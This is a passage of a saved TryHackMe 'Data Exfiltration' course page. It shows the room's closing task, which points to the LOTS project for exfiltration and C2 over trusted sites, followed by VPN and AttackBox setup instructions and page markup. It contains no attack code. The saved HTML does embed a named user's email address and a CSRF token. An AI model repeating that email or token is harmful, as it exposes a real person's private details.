&#39;ghsw6sUq&#39;)">PII</a>) and financial information.</span></li></ol><p><span style="font-size:24px">Additional Resources</span></p><p><span>Data Exfiltration is not limited to protocols and methods discussed in this room. The following link is a Living Off Trusted Sites that could be used to exfiltrate data or for <a class="jTooMFHv glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;jTooMFHv&#39;)">C2</a> communication using legitimate websites.&nbsp;</span></p><ul><li><a href="https://lots-project.com/">Living Off Trusted Sites (LOTS) Project</a></li></ul></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <div><span style="font-size:1rem">Read the closing task.</span><br></div>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="11">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div></div>
</div>
<div id="room-simple-details"><div class="card cd-2 text-center mt-3"><div class="card-body"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Data Exfiltration_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a></p><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 7514 users are in here and this room is 324 days old.</p></div></div></div>

</div>
</div>
</div>
<div id="room-content-attackbox">
<div id="room-attackbox">
<div id="attackbox-machine-instance">
<div id="room-attackbox-loading"></div>
<div id="room-attackbox-vm-view"></div>
</div>
<div id="attackbox-machine-options">
<div class="d-flex">
<a target="_blank" id="room-attackbox-url" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="View in full screen"></a>
<div onclick="extendHourWebBasedVM(null)" class="hover-pointer" id="room-attackbox-extend" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Extend machines timer"><i class="fas fa-plus"></i></div>
<div onclick="terminateWebBasedVM(null)" class="hover-pointer" id="room-attackbox-terminate" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Terminate Machine"><i class="far fa-power-off"></i></div>
<div onclick="exitViewAttackBox()" class="hover-pointer" id="room-attackbox-exitview" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Exit split view"><i class="fas fa-minus"></i></div>
<div onclick="infoAttackBox()" class="hover-pointer faded" id="room-attackbox-info" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Machine Information"><i class="fas fa-info"></i></div>
<div class="d-flex" id="room-attackbox-tabs"></div>
</div>
<div id="room-attackbox-expire-text" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Time left until your AttackBox expires"></div>
</div>
</div>
<div class="modal fade" id="attackBoxInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-light-gray">
<h5 class="modal-title m-auto">Web-Based Machine Information</h5>
</div>
<div class="modal-body">
<p>Use the web-based machine to attack other target machines you start on TryHackMe.</p>
<ul class="normalList text-gray mt-3 mb-4">
<li>Public IP: <code id="browser-machine-pubip" class="dark size-14"></code></li>
<li class="mt-1">Private IP: <code id="browser-machine-privip" class="dark size-14"></code> <span class="size-14">(Use this for your reverse shells)</span></li>
<li class="mt-1">Username: <code id="browser-username" class="dark size-14"></code></li>
<li class="mt-1">Password: <code id="browser-password" class="dark size-14"></code></li>
<li class="mt-1">Protocol: <code id="browser-protocol" class="dark size-14"></code></li>
</ul>
<hr class="hr-min">
<ul class="text-lgray mb-0">
<li class="mt-2">To copy to and from the browser-based machine, highlight the text and press <b>CTRL+SHIFT+C</b> <details><summary>or use the clipboard</summary><img src="./TryHackMe _ Data Exfiltration_files/clipboard.gif"></details></li>
<li class="mt-2">When accessing target machines you start on TryHackMe tasks, make sure you're using the correct IP (it <b>should not be</b> the IP of your AttackBox)</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="award-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<button type="button" class="close size-30 text-lgray" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
<div id="award-modal-badges"></div>
<p class="mb-0 text-lgray size-18">Complete the room to earn this badge</p>
</div>
</div>
</div>
</div>
<div class="modal fade" id="hint-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title"><i class="fal fa-lightbulb-on"></i> Question Hint</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body"></div>
</div>
</div>
</div>
<div class="modal fade" id="modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">...</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body text-center"></div>
<div class="modal-footer"></div>
</div>
</div>
</div>
<link rel="stylesheet" href="./TryHackMe _ Data Exfiltration_files/modal.css">
<div class="modal-design-green modal fade" id="roomCompleted" tabindex="-1" role="dialog" data-backdrop="static" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content" id="roomCompletedModalContent">
<div class="modal-body text-center">
<button type="button" class="close" id="closeRoomComplete" aria-label="Close">
<i class="fad fa-times-circle"></i>
</button>
<div class="icon-box">
<i class="fad fa-badge-check"></i>
</div>
<h3 class="text-accent mt-5">Congratulations</h3>
<p class="faded mt-1">You've completed the room! Share this with your friends: </p>
<h2 id="roomCompleted-share"></h2>
<div id="ticket-info"></div> 
<p class="faded mt-1" id="roomFeedbackBtn">
<small>
<button class="bg-white border-0">Leave
feedback</button>
</small>
</p>
<form method="post" action="https://tryhackme.com/feedback" id="roomFeedbackForm" class="d-none mt-3">
<input type="hidden" name="_csrf" value="xacPYOlz-ZsRFBNzBiqBXbE_qiZd3VcAVDVs">
<input type="hidden" name="roomCode" value="dataxexfilt">
<input type="hidden" name="type" value="rooms">
<input type="hidden" name="redirect" value="json">
<div class="form-group">
<label class="mb-0" for="like">What do you like about the room?</label>
<textarea type="text" name="like" id="like" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="dislike">What don't you like about the room?</label>
<textarea type="text" name="dislike" id="dislike" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="details">Please send your suggestions, ideas and comments!</label>
<textarea id="details" type="text" name="details" class="form-control" style="padding: 5px;"></textarea>
</div>
<button type="submit" id="submitBtn" class="btn btn-success">Send Feedback</button>
</form>
<p class="mt-2 mb-0" id="formMessage"></p>
</div>
</div>
</div>
<script>
    function dismissRoomCompleteModal() {
      $('#roomCompleted').modal('hide');

      const shouldSeeReferralModal = ""
      if (shouldSeeReferralModal) {
        $('#unlockCreditModal').modal('show');

        referralModalEvent('view');
      }
    }

    document.getElementById('closeRoomComplete').addEventListener('click', dismissRoomCompleteModal)
  </script>
</div>
<script src="./TryHackMe _ Data Exfiltration_files/roomFeedback.js"></script>
<div class="modal fade" id="roomStartAttackboxModal" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static" data-keyboard="false">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title m-auto">To access this machine, you need to either</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close" style="position: absolute; right: 10px; top: 0; font-size: 30px;">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body text-center">
<div class="row vertical-align-custom mb-0">
<div class="col-sm-5 pr-0">
<p class="size-18 bold">Use a VPN</p>
<p>Connect to our network via a VPN</p>
<a target="_blank" href="https://tryhackme.com/access"><button type="button" class="btn btn-light">See Instructions</button></a>
</div>
<div class="col-sm-2 size-24">
or
</div>
<div class="col-sm-5 pl-0">
<p class="size-18 bold">Use the AttackBox</p>
<p>Use a web-based attack machine <span class="size-12">(recommended)</span></p>
<button type="button" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;); startAttackBox({startingMsg: false, tutorial: true})" class="btn btn-hgreen">Start AttackBox</button>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="expireSoon" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-warning fad fa-exclamation-triangle"></i></h1>
<h3 class="text-warning">Expiring Soon</h3>
<p class="faded mt-3 mb-0">Your machine is going to expire soon. Close this and add an hour to stop it from terminating!</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="terminatedMachine" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-danger fad fa-exclamation-triangle"></i></h1>
<h3 class="text-danger">Expired Machine</h3>
<p class="faded mt-3 mb-0">Your machine has expired and terminated.</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="machineDeployModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue text-center p-3">
<h4 class="mb-0 m-auto">How to access machines</h4>
<button type="button" class="close modal-close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body text-center">
<p class="size-18 faded">Now you've started your machine, to access it you need to either</p>
<div class="row mb-0">
<div class="col-sm-6">
<img src="./TryHackMe _ Data Exfiltration_files/connect_openvpn_short.png">
<p class="mt-2 mb-0 faded">Download your VPN configuration file and import it into a OpenVPN client</p>
</div>
<div class="col-sm-6">
<img src="./TryHackMe _ Data Exfiltration_files/connect_kali_short.png">
<p class="mt-2 mb-0 faded">Control a web-based machine with everything you need, all from inside your browser</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="roomAlertModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title" id="roomAlertModalTitle"></h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body" id="roomAlertModalBody"></div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="resetUserProgressModal" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">Reset Your Progress</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body">
<div><span class="text-danger"><i class="fas fa-exclamation-triangle"></i> Warning</span> You will keep your points but all your answers in this room will be erased.</div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-danger" onclick="resetProgress()">Yes, please!</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="cloudEnvInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header  modal-dark-blue">
<h5 class="modal-title">Cloud Information</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body">
<ul class="nav nav-tabs">
<li class="nav-item pr-2">
<a class="nav-link active" data-toggle="tab" href="https://tryhackme.com/room/dataxexfilt#env-tab">Environment</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/dataxexfilt#creds-tab">Credentials</a>
</li>
</ul>
<div class="tab-content">
<div class="tab-pane active" id="env-tab"></div>
<div class="tab-pane" id="creds-tab"></div>
</div>
</div>
<div class="modal-footer" id="cloudEnvModalFooter">
</div>
</div>
</div>
</div>
<div class="modal fade" id="setNameModal" role="dialog">
<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title">Generating Your Certificate</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body container">
<div class="row">
<div class="col-6">
<h5 class="bold">Hey there, what's your name?</h5>
<p class="text-secondary">
If you want your name to appear on your certificate, please fill the field below.
</p>
<div class="form-group">
<label>Full Name </label>
<input id="modal-cert-field-name" type="text" placeholder="John Wick" class="mb-4 form-control">
<input id="modal-cert-field-email" type="hidden" value="giftonpaul@karunya.edu.in">
</div>
</div>
<div class="col-6">
<h5 class="bold">You're here incognito? It's ok!</h5>
<p class="text-secondary">If you chose skip, your username will be used instead!</p>
</div>
</div>
<div class="row">
<div class="col-6">
<button type="button" class="btn btn-success float-right" id="modal-cert-generate" onclick="gen_cert(true)" disabled="">
Generate with my full name
</button>
</div>
<div class="col-6">
<button type="button" class="btn btn-primary float-right" id="modal-cert-skip" onclick="gen_cert(false)">
Generate with my username
</button>
</div>
</div>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Data Exfiltration_files/certificateName.js"></script>
<div class="modal fade slideout-faq" id="roomSlideoutUnstuck" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-links">
<div id="unstuck-video" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-play"></i></div>
<div class="unstuck-icon-text">Video Solution</div>
</div>
<div id="unstuck-writeups" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-pen-alt"></i></div>
<div class="unstuck-icon-text">Writeups</div>
</div>
<a id="unstuck-forum" target="_blank" class="clear-link unstuck-group" href="https://tryhackme.com/forum/thread/630a31706458eccfa70c2b2c">
<div class="unstuck-icon"><i class="fas fa-comments-alt"></i></div>
<div class="unstuck-icon-text">Forum Post</div>
</a>
<a href="https://help.tryhackme.com/en/collections/3601905-getting-started-with-tryhackme" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-books"></i></div>
<div class="unstuck-icon-text">Knowledge Base</div>
</a>
<a href="https://discord.gg/DpBZz8y" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-users"></i></div>
<div class="unstuck-icon-text">Ask Community</div>
</a>
</div>
</div>
</div>
</div>
</div>
<style>

    #navConnModal .modal-body{
        position: relative;
    }

    #nav-openvpn,
    #nav-attackbox {
        display: none;
    }

    #nav-openvpn .nav-pills .nav-link.active,
    #nav-openvpn .nav-pills .show>.nav-link {
        background-color: #ec8e3d;
        color: white;
    }
    #nav-openvpn .nav-link {
        color: #909090;
    }
    #nav-openvpn a,
    #nav-attackbox a {
        color: #ec8e3d;
    }

    #nav-openvpn code.dark {
        background-color: #7d400a;
        color: #fff;
    }

    #slideout-bk {
        display: none;
        padding: 10px 15px;
        opacity: 0.8;
        cursor: pointer;
    }

    #slideout-bk:hover {
        opacity: 1;
    }

    #slideout-conn-hideip {
        display: none;
        position: absolute;
        bottom: 8px;
        right: 8px;
        opacity: 0.7;
        cursor: pointer;
    }

    #slideout-conn-hideip:hover {
        opacity: 1;
    }

</style>
<div class="modal fade slideout-faq" id="navConnModal" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-bk" class="noselect" onclick="showSlideoutConnOptions()"><i class="far fa-arrow-left mr-2"></i> Show Connection Options</div>
<div id="slideout-conn-options">
<div id="slideout-conn-header" class="text-center">
<img class="slideout-connect-img" src="./TryHackMe _ Data Exfiltration_files/tryhackme_connect.png">
<div id="slideout-conn-status" class="size-22">You are <span class="text-danger">disconnected</span></div>
</div>
<div class="m-3 text-center">
<p>To access target machines you need to either:</p>
<div class="row mb-3 faq-quicklinks text-left vertical-align-custom">
<div class="col-md-12 mb-3">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/dataxexfilt#" onclick="showAttackBoxSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-laptop"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">AttackBox</div>
<p class="faded mb-0">Use a browser-based attack machine</p>
</div>
</div>
</div>
</a>
</div>
<div class="col-md-12">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/dataxexfilt#" onclick="showVPNSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-key"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">OpenVPN</div>
<p class="faded mb-0">Connect to our network via a VPN</p>
</div>
</div>
</div>
</a>
</div>
</div>
</div>
</div>
<div id="faqCards" class="p-3">
<div id="nav-openvpn">
<div class="mb-3">
<a target="_blank" href="https://tryhackme.com/access"><i>View the dedicated OpenVPN access page for more information</i></a>
</div>
<div class="text-center">
<h4>What Operating System are you using?</h4>
<ul class="nav nav-pills mb-3 text-center" id="vpn-guide" style="display: flex; justify-content: center;">
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/dataxexfilt#pills-windows" role="tab" aria-controls="pills-windows" aria-selected="true"><i class="fab fa-windows mr-2"></i> Windows</a>
</li>
<li class="nav-item m-3">
<a class="nav-link active" data-toggle="pill" href="https://tryhackme.com/room/dataxexfilt#pills-linux" role="tab" aria-controls="pills-linux" aria-selected="false"><i class="fab fa-linux mr-2"></i> Linux</a>
</li>
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/dataxexfilt#pills-macos" role="tab" aria-controls="pills-macos" aria-selected="false"><i class="fab fa-apple mr-2"></i> MacOS</a>
</li>
</ul>
<div class="tab-content text-left">
<div class="tab-pane fade" id="pills-windows" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a target="_blank" href="https://openvpn.net/client-connect-vpn-for-windows/">Download</a> the OpenVPN GUI application.</li>
<li class="mt-2">Install the OpenVPN GUI application. Then open the installer file and follow the setup wizard.</li>
<li class="mt-2">Open and run the OpenVPN GUI application as Administrator.<br><img class="mt-2 mb-3" src="./TryHackMe _ Data Exfiltration_files/win_ran_admin.png"></li>
<li class="mt-2">The application will start running in the system tray. It's at the bottom of your screen, near the clock. Right click on the application and click <b>Import File</b>. <br><img class="mt-2 mb-3" src="./TryHackMe _ Data Exfiltration_files/win_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Now right click on the application again, select your file and click Connect <br><img class="mt-2 mb-3" src="./TryHackMe _ Data Exfiltration_files/win_connect.png"></li>
</ol>
</div>
<div class="tab-pane fade show active" id="pills-linux" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2">Run the following command in your terminal: <code class="dark">sudo apt install openvpn</code></li>
<li class="mt-2">Locate the full path to your VPN configuration file (normally in your ~/Downloads folder).</li>
<li class="mt-2">Use your OpenVPN file with the following command: <code class="dark">sudo openvpn /path/to/file.ovpn</code></li>
</ol>
</div>
<div class="tab-pane fade" id="pills-macos" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a href="https://openvpn.net/downloads/openvpn-connect-v2-macos.dmg">Download</a> OpenVPN for MacOS.</li>
<li class="mt-2">Install the OpenVPN GUI application, by opening the dmg file and following the setup wizard.<br><img width="250" class="mt-2 mb-3" src="./TryHackMe _ Data Exfiltration_files/mac_installer.png"></li>
<li class="mt-2">Open and run the OpenVPN GUI application.</li>
<li class="mt-2">The application will start running and appear in your top bar. Right click on the application and click <b>Import File -&gt; Local file</b>.<br><img class="mt-2 mb-3" src="./TryHackMe _ Data Exfiltration_files/mac_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Right click on the application again, select your file and click connect.<br><img class="mt-2 mb-3" src="./TryHackMe _ Data Exfiltration_files/mac_connect.png"></li>
</ol>
</div>
</div>
<section class="text-left">
<a class="remove-underline" data-toggle="collapse" href="https://tryhackme.com/room/dataxexfilt#havingProblems" role="button" aria-expanded="false" aria-controls="havingProblems">
<h5 class="mb-0 text-openvpn">Having Problems?</h5>
</a>
<div class="collapse" id="havingProblems">
<ul class="mt-2 mb-0">
<li>If you can access <a target="_blank" href="http://10.10.10.10/">10.10.10.10</a>, you're connected.</li>
<li>Downloading and getting a 404? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>Getting inline cert error? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>If you are using a virtual machine, you will need to run the VPN inside that machine.</li>
<li>Is the OpenVPN client running as root? <span class="size-14 faded">(On Windows, run OpenVPN GUI as administrator. On Linux, run with sudo)</span></li>
<li>Have you restarted your VM?</li>
<li>Is your OpenVPN up-to-date?</li>
<li>Only 1 OpenVPN connection is allowed. <span class="size-14 faded">(Run <code class="dark">ps aux | grep openvpn</code> - are there 2 VPN sessions running?)</span></li>
<li>Still having issues? Check our <a href="https://help.tryhackme.com/en/articles/6496029-openvpn-general-troubleshooting-detailed/">docs</a> out.</li>
</ul>
</div>
</section>
</div>
</div>
<div id="nav-attackbox">
<div class="text-center">
<h4>AttackBox</h4>
<p class="faded">Use your own web-based linux machine to access machines on TryHackMe</p>
</div>
<p>To start your AttackBox in the room, click the <a class="preventDefault" onclick="showAttackBoxBtnFromSlideout()" href="https://tryhackme.com/room/dataxexfilt#">Start AttackBox</a> button. Your private machine will take 2 minutes to start.</p>
<p>Free users get 1 free AttackBox hour. <a class="hacker-green" href="https://tryhackme.com/why-subscribe">Subscribed</a> users get more powerful machines with unlimited deploys.</p>
</div>
</div>
<span id="slideout-conn-hideip" onclick="hideNavConnIP()" style="display: none;">Hide IP</span>
</div>
</div>
</div>
</div>
<script>

    const navConnVPNEl = document.querySelector('#nav-openvpn')
    const navConnAttackBoxEl = document.querySelector('#nav-attackbox')
    const navConnOptions = document.querySelector('#slideout-conn-options')

    const navConnBkBtn = document.querySelector('#slideout-bk')

    function showVPNSteps() {
        navConnOptions.style.display = 'none'
        navConnVPNEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showAttackBoxSteps() {
        navConnOptions.style.display = 'none'
        navConnAttackBoxEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showSlideoutConnOptions() {
        navConnVPNEl.style.display = 'none'
        navConnAttackBoxEl.style.display = 'none'
        navConnBkBtn.style.display = 'none'
        navConnOptions.style.display = 'block'
    }

    function showAttackBoxBtnFromSlideout() {
        $('#navConnModal').modal('toggle')
        setTimeout(function() {
            showAttackBoxBtnIntro()
        }, 100)   
    }

  </script>
</div>
<script src="./TryHackMe _ Data Exfiltration_files/notify.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/api-requests.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/events.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/underscore-min.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/apexcharts.min.js"></script> 
<script src="./TryHackMe _ Data Exfiltration_files/chart.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/expire.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/sockets.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/faqSearch.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/certificate.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/utils.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/roomSpecific.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/confetti.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/videos.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/intro.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/prism.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/asciinema-player.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/magnific-popup.min.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/introjsLogic.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/logic.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/tasks.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/connection-status.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/glossary.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/room-mymachine.js"></script>
<script src="./TryHackMe _ Data Exfiltration_files/heartbeat.js" defer=""></script>
<script>

    let height
    $(window).scroll(function () { /* Function to make IP information sticky. */
      if (height == undefined || height < 30) {
        height = ($('#instance-info').offset().top)
      }
      let scroll = $(window).scrollTop()
      if (((scroll >= (height + 150))) && height > 30) {
        $("#instance-info").addClass('instance-sticky')
      } else if ((scroll <= (height))) {
        $("#instance-info").removeClass("instance-sticky")
      }
    })

    const csrfToken = "xacPYOlz-ZsRFBNzBiqBXbE_qiZd3VcAVDVs"
    $.ajaxSetup({ headers: { 'CSRF-Token': csrfToken } }) // all $.post headers include token (needs csrfProtection middleware)

    const roomCode = "dataxexfilt"
    const simpleRoom = true 
    const events = {"tickets":false}

    let userObj = { 
      subscribed: 1,
      splitScreen: true,
      path: "redteaming",
      tutorial: {
        rooms: true,
        attackbox: true,
        staticsite: true
      },
      experiments:  JSON.parse(`{"onboardingAchievement":{},"scheduler":{"startDate":"2023-06-14T13:38:51.108Z"},"showEasyPath":true}`),
    }

    const roomSettings = {
      remAttackBoxBtn : false
    };

    const heartbeatInterval = 30;

    const cloudEnabled = false 
    let cloudObj

    initRoom()
    checkVideoTab()
    if(!simpleRoom) showChart(roomCode)

    checkRoomAwards(roomCode)

    getRoomVotes()

    displayStreakFreezeAwardedFromMemory();
    
    window.addEventListener('load', function () {
      introjsInit(roomCode)
    })

  </script>


<svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;"><defs id="SvgjsDefs1002"></defs><polyline id="SvgjsPolyline1003" points="0,0"></polyline><path id="SvgjsPath1004" d="M0 0 "></path></svg><div id="CD0E388E-D76B-B054-AAFD-2FEF0FF59E86"></div><iframe id="_hjSafeContext_18760791" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./TryHackMe _ Data Exfiltration_files/saved_resource.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./TryHackMe _ Data Exfiltration_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><img src="./TryHackMe _ Data Exfiltration_files/9e0f012f15b6fc981dde2f1f5198d728.png" alt="" class="intercom-lightweight-app-launcher-custom-icon-open"></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" clip-rule="evenodd" d="M18.601 8.39897C18.269 8.06702 17.7309 8.06702 17.3989 8.39897L12 13.7979L6.60099 8.39897C6.26904 8.06702 5.73086 8.06702 5.39891 8.39897C5.06696 8.73091 5.06696 9.2691 5.39891 9.60105L11.3989 15.601C11.7309 15.933 12.269 15.933 12.601 15.601L18.601 9.60105C18.9329 9.2691 18.9329 8.73091 18.601 8.39897Z" fill="white"></path>
</svg>
</div></div><style id="intercom-lightweight-app-style" type="text/css">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    0% {
      opacity: 0;
      transform: scale(0);
    }
    40% {
      opacity: 1;
    }
    100% {
      transform: scale(1);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
